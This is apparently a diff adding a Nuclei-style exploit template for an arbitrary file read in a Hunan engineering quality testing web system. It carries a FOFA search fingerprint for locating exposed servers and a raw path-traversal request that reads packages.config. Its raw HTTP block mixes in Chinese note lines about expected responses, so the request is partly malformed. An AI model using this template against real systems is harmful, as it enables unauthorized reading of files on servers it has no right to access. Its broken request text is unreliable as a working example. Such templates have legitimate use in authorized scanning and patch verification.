@@ -1,0 +1,34 @@
+id: poc-yk5mcfu31dc4mdw4
+info:
+  name: 湖南建研工程质量检测系统 InstrumentUsageRecordExport 任意文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yk5mcfu31dc4mdw4'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yk5mcfu31dc4mdw4
+    fofa: body="/Content/Theme/Standard/webSite/login.css"
+http:
+- raw:
+  - 'GET /Applications/Forms/Custom/InstrumentUsageRecordExport.cshtml?act=down&path=../packages.config HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    attachment
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
